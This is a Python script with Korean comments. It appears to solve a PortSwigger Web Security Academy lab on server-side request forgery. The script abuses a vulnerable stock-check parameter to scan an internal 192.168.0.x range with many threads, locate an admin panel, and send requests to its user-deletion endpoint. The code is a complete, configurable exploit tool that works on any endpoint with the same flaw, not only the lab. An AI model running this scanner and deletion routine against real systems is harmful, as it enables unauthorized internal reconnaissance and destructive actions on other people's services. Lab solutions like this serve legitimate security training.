#!/usr/bin/env python3
"""
SSRF - Internal IP Scanner
PortSwigger Lab: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

URL 파라미터를 통한 SSRF 로 내부 IP 대역을 스캔해 관리자 패널을 찾는다.

사용 예시:
  # 기본 스캔 (192.168.0.1~255, 포트 8080)
  python3 08-ssrf-internal-scan.py \\
    --target "https://LAB-ID.web-security-academy.net/product/stock" \\
    --param stockApi \\
    --prefix 192.168.0 \\
    --port 8080

  # 관리자 패널 확인 후 삭제
  python3 08-ssrf-internal-scan.py \\
    --target "https://LAB-ID.web-security-academy.net/product/stock" \\
    --param stockApi \\
    --prefix 192.168.0 \\
    --port 8080 \\
    --delete carlos \\
    --admin-ip 192.168.0.42
"""

import argparse
import sys
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

THREADS = 20
TIMEOUT = 10


def scan_ip(target_url: str, param: str, ip: str, port: int,
            admin_path: str, session: str | None) -> tuple[str, int, str]:
    """단일 IP 로 SSRF 요청을 보내고 (ip, status_code, body) 를 반환한다."""
    internal_url = f"http://{ip}:{port}{admin_path}"
    data = {param: internal_url}
    cookies = {"session": session} if session else {}
    try:
        resp = requests.post(
            target_url, data=data, cookies=cookies,
            verify=False, timeout=TIMEOUT, allow_redirects=True
        )
        return ip, resp.status_code, resp.text
    except requests.exceptions.RequestException as e:
        return ip, 0, str(e)


def delete_user(target_url: str, param: str, admin_ip: str, port: int,
                username: str, session: str | None) -> bool:
    """SSRF 로 내부 admin 패널의 사용자 삭제 엔드포인트를 호출한다."""
    delete_url = f"http://{admin_ip}:{port}/admin/delete?username={username}"
    data = {param: delete_url}
    cookies = {"session": session} if session else {}

    # 요청 패킷 미리보기 (PreparedRequest 로 실제 전송 전 내용 출력)
    req = requests.Request("POST", target_url, data=data, cookies=cookies)
    prepared = req.prepare()
    print(f"\n{'='*60}")
    print(f"[REQUEST]")
    print(f"  {prepared.method} {prepared.url}")
    print(f"  Headers:")
    for k, v in prepared.headers.items():
        print(f"    {k}: {v}")
    print(f"  Body: {prepared.body}")
    print(f"  (SSRF 내부 대상: {delete_url})")
    print(f"{'='*60}")

    try:
        resp = requests.post(
            target_url, data=data, cookies=cookies,
            verify=False, timeout=TIMEOUT, allow_redirects=True
        )
        print(f"[RESPONSE]")
        print(f"  Status : {resp.status_code}")
        # 리다이렉트 이력 출력
        if resp.history:
            for r in resp.history:
                print(f"  Redirect: {r.status_code} → {r.headers.get('Location', '')}")
        print(f"  Body   :\n{resp.text[:800]}")
        print(f"{'='*60}\n")
        return resp.status_code in (200, 302)
    except requests.exceptions.RequestException as e:
        print(f"[DELETE ERROR] {e}")
        return False


def main() -> None:
    parser = argparse.ArgumentParser(
        description="SSRF 내부 IP 스캐너 — 관리자 패널 탐색 및 사용자 삭제"
    )
    parser.add_argument(
        "--target", required=True,
        help="취약한 엔드포인트 URL (예: https://LAB.web-security-academy.net/product/stock)"
    )
    parser.add_argument(
        "--param", default="stockApi",
        help="SSRF 가 발생하는 파라미터 이름 (기본값: stockApi)"
    )
    parser.add_argument(
        "--prefix", default="192.168.0",
        help="스캔할 IP 대역 앞 세 옥텟 (기본값: 192.168.0)"
    )
    parser.add_argument(
        "--port", type=int, default=8080,
        help="내부 서비스 포트 (기본값: 8080)"
    )
    parser.add_argument(
        "--admin-path", default="/admin",
        help="관리자 패널 경로 (기본값: /admin)"
    )
    parser.add_argument(
        "--session", default=None,
        help="인증된 세션 쿠키 값 (필요한 경우)"
    )
    parser.add_argument(
        "--start", type=int, default=1,
        help="스캔 시작 호스트 번호 (기본값: 1)"
    )
    parser.add_argument(
        "--end", type=int, default=255,
        help="스캔 종료 호스트 번호 (기본값: 255)"
    )
    parser.add_argument(
        "--success-code", type=int, default=200,
        help="admin 패널 발견 기준 HTTP 상태코드 (기본값: 200)"
    )
    parser.add_argument(
        "--threads", type=int, default=THREADS,
        help=f"동시 요청 스레드 수 (기본값: {THREADS})"
    )
    # 삭제 옵션
    parser.add_argument(
        "--delete", default=None, metavar="USERNAME",
        help="삭제할 사용자 이름 (--admin-ip 와 함께 사용)"
    )
    parser.add_argument(
        "--admin-ip", default=None,
        help="삭제 시 사용할 admin 서버 IP (스캔 없이 바로 삭제할 때)"
    )

    args = parser.parse_args()

    # 삭제만 실행하는 경우
    if args.delete and args.admin_ip:
        print(f"[*] 사용자 삭제 모드: {args.delete} @ {args.admin_ip}:{args.port}")
        delete_user(args.target, args.param, args.admin_ip,
                    args.port, args.delete, args.session)
        return

    # 스캔 실행
    ips = [f"{args.prefix}.{i}" for i in range(args.start, args.end + 1)]
    print(f"[*] 스캔 시작: {args.prefix}.{args.start} ~ {args.prefix}.{args.end}")
    print(f"    대상 URL  : {args.target}")
    print(f"    파라미터  : {args.param}")
    print(f"    내부 포트 : {args.port}")
    print(f"    경로      : {args.admin_path}")
    print(f"    스레드    : {args.threads}")
    print()

    found = []

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {
            executor.submit(
                scan_ip, args.target, args.param, ip,
                args.port, args.admin_path, args.session
            ): ip
            for ip in ips
        }
        for future in as_completed(futures):
            ip, status, body = future.result()
            if status == 0:
                continue
            if status == args.success_code:
                print(f"\n  [FOUND] {ip}:{args.port}  →  HTTP {status}")
                print(f"  {'─'*60}")
                #print(f"{body[:800]}")
                print(f"{body}")
                print(f"  {'─'*60}\n")
                found.append((ip, body))
            else:
                print(f"  {ip}:{args.port}  →  HTTP {status}")

    print()
    if found:
        ips_found = [ip for ip, _ in found]
        print(f"[+] admin 패널 발견: {ips_found}")
        if args.delete:
            for ip, _ in found:
                print(f"\n[*] {ip} 에서 '{args.delete}' 삭제 시도...")
                ok = delete_user(args.target, args.param, ip,
                                 args.port, args.delete, args.session)
                if ok:
                    print(f"[+] 삭제 완료 또는 요청 수락")
        else:
            print(f"\n[!] 삭제하려면 아래 명령 실행:")
            for ip, _ in found:
                print(
                    f"    python3 {sys.argv[0]} "
                    f"--target \"{args.target}\" "
                    f"--param {args.param} "
                    f"--port {args.port} "
                    f"--admin-ip {ip} "
                    f"--delete <USERNAME>"
                )
    else:
        print(f"[-] HTTP {args.success_code} 응답을 받은 IP 없음")
        print("    --success-code 또는 --port 를 조정해 재시도")


if __name__ == "__main__":
    main()
